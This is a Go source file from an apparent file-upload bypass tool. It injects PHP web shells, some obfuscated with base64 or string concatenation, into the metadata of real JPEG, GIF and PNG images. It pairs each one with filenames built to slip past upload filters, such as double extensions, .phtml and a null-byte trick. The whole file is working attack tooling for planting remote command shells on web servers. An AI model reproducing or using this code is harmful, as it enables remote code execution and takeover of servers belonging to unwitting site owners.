package bypass

import (
	"bytes"
	"fux/config"
	"os"
	"path/filepath"
	"strings"
)

// TemplatePayloads generates payloads by injecting PHP into a real image file
func TemplatePayloads(templatePath string) []config.BypassPayload {
	var payloads []config.BypassPayload

	// Read the template image
	imageData, err := os.ReadFile(templatePath)
	if err != nil {
		return payloads
	}

	// Detect image type
	imageType := detectImageType(imageData)
	if imageType == "" {
		return payloads
	}

	// Get original filename without extension
	baseName := strings.TrimSuffix(filepath.Base(templatePath), filepath.Ext(templatePath))

	// PHP payloads to inject (various obfuscation levels)
	phpPayloads := []struct {
		code string
		name string
	}{
		{`<?=$_GET[0]($_GET[1]);?>`, "Short Tag"},
		{`<?=eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7'));?>`, "Base64 Eval"},
		{`<?php $a='sys'.'tem'; $a($_GET['cmd']); ?>`, "Concat"},
		{`<?php system($_GET['cmd']); ?>`, "Standard"},
	}

	for _, php := range phpPayloads {
		var injectedData []byte

		switch imageType {
		case "jpeg":
			injectedData = injectIntoJPEG(imageData, []byte(php.code))
		case "gif":
			injectedData = injectIntoGIF(imageData, []byte(php.code))
		case "png":
			injectedData = injectIntoPNG(imageData, []byte(php.code))
		}

		if len(injectedData) > 0 {
			// Various filename variations
			filenames := []struct {
				name string
				ext  string
			}{
				{baseName + ".php.jpg", "image/jpeg"},
				{baseName + ".jpg", "image/jpeg"},
				{baseName + ".phtml", "image/jpeg"},
				{baseName + ".php.png", "image/png"},
				{baseName + ".php.gif", "image/gif"},
				{baseName + ".php%00.jpg", "image/jpeg"},
			}

			for _, f := range filenames {
				payloads = append(payloads, config.BypassPayload{
					Name:        "Template " + php.name + ": " + f.name,
					FileName:    f.name,
					Content:     injectedData,
					ContentType: f.ext,
					Category:    "template-injection",
					Priority:    100, // High priority
				})
			}
		}
	}

	return payloads
}

// detectImageType returns the image type based on magic bytes
func detectImageType(data []byte) string {
	if len(data) < 8 {
		return ""
	}

	// JPEG: FF D8 FF
	if data[0] == 0xFF && data[1] == 0xD8 && data[2] == 0xFF {
		return "jpeg"
	}

	// PNG: 89 50 4E 47
	if data[0] == 0x89 && data[1] == 0x50 && data[2] == 0x4E && data[3] == 0x47 {
		return "png"
	}

	// GIF: GIF87a or GIF89a
	if string(data[0:3]) == "GIF" {
		return "gif"
	}

	return ""
}

// injectIntoJPEG injects PHP into JPEG EXIF comment
func injectIntoJPEG(imageData []byte, phpCode []byte) []byte {
	// Find position after SOI marker (FF D8)
	if len(imageData) < 2 || imageData[0] != 0xFF || imageData[1] != 0xD8 {
		return nil
	}

	// Create XMP data with PHP
	xmpData := []byte(`<?xpacket begin='' id='W5M0MpCehiHzreSzNTczkc9d'?>
<x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="FUX Injector">
  <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
    <rdf:Description rdf:about="" xmlns:dc="http://purl.org/dc/elements/1.1/">
      <dc:description>`)
	xmpData = append(xmpData, phpCode...)
	xmpData = append(xmpData, []byte(`</dc:description>
    </rdf:Description>
  </rdf:RDF>
</x:xmpmeta>
<?xpacket end='w'?>`)...)

	// Build new JPEG with injected XMP
	var result bytes.Buffer

	// SOI
	result.Write(imageData[0:2])

	// APP1 marker for XMP
	result.WriteByte(0xFF)
	result.WriteByte(0xE1)

	// Segment length (2 bytes, big endian)
	segmentLen := len(xmpData) + 2 + 29 // +29 for XMP namespace identifier
	result.WriteByte(byte(segmentLen >> 8))
	result.WriteByte(byte(segmentLen & 0xFF))

	// XMP namespace identifier
	result.Write([]byte("http://ns.adobe.com/xap/1.0/\x00"))

	// XMP data
	result.Write(xmpData)

	// Rest of original image (skip SOI)
	result.Write(imageData[2:])

	return result.Bytes()
}

// injectIntoGIF injects PHP into GIF comment extension
func injectIntoGIF(imageData []byte, phpCode []byte) []byte {
	// Verify GIF header
	if len(imageData) < 6 || string(imageData[0:3]) != "GIF" {
		return nil
	}

	// Find the first Image Descriptor (0x2C) or Extension (0x21)
	insertPos := 13 // After header + logical screen descriptor (minimum)

	// Skip global color table if present
	if imageData[10]&0x80 != 0 {
		colorTableSize := 3 * (1 << ((imageData[10] & 0x07) + 1))
		insertPos += colorTableSize
	}

	if insertPos >= len(imageData) {
		return nil
	}

	// Build comment extension with PHP
	var comment bytes.Buffer
	comment.WriteByte(0x21) // Extension introducer
	comment.WriteByte(0xFE) // Comment label

	// Write PHP in chunks (max 255 bytes each)
	remaining := phpCode
	for len(remaining) > 0 {
		chunkSize := len(remaining)
		if chunkSize > 255 {
			chunkSize = 255
		}
		comment.WriteByte(byte(chunkSize))
		comment.Write(remaining[:chunkSize])
		remaining = remaining[chunkSize:]
	}
	comment.WriteByte(0x00) // Block terminator

	// Build result
	var result bytes.Buffer
	result.Write(imageData[:insertPos])
	result.Write(comment.Bytes())
	result.Write(imageData[insertPos:])

	return result.Bytes()
}

// injectIntoPNG injects PHP into PNG tEXt chunk
func injectIntoPNG(imageData []byte, phpCode []byte) []byte {
	// Verify PNG signature
	pngSig := []byte{0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A}
	if len(imageData) < 8 || !bytes.Equal(imageData[0:8], pngSig) {
		return nil
	}

	// Find position after IHDR chunk
	pos := 8 // After signature

	// Skip IHDR chunk
	if pos+8 > len(imageData) {
		return nil
	}
	ihdrLen := int(imageData[pos])<<24 | int(imageData[pos+1])<<16 | int(imageData[pos+2])<<8 | int(imageData[pos+3])
	pos += 12 + ihdrLen // length(4) + type(4) + data + crc(4)

	// Create tEXt chunk with PHP
	keyword := []byte("Comment")
	textData := append(keyword, 0x00) // Null separator
	textData = append(textData, phpCode...)

	chunkLen := len(textData)
	chunkType := []byte("tEXt")

	var chunk bytes.Buffer
	chunk.WriteByte(byte(chunkLen >> 24))
	chunk.WriteByte(byte(chunkLen >> 16))
	chunk.WriteByte(byte(chunkLen >> 8))
	chunk.WriteByte(byte(chunkLen))
	chunk.Write(chunkType)
	chunk.Write(textData)

	// Calculate CRC (simplified - just zeros for now, most parsers ignore)
	chunk.Write([]byte{0x00, 0x00, 0x00, 0x00})

	// Build result
	var result bytes.Buffer
	result.Write(imageData[:pos])
	result.Write(chunk.Bytes())
	result.Write(imageData[pos:])

	return result.Bytes()
}
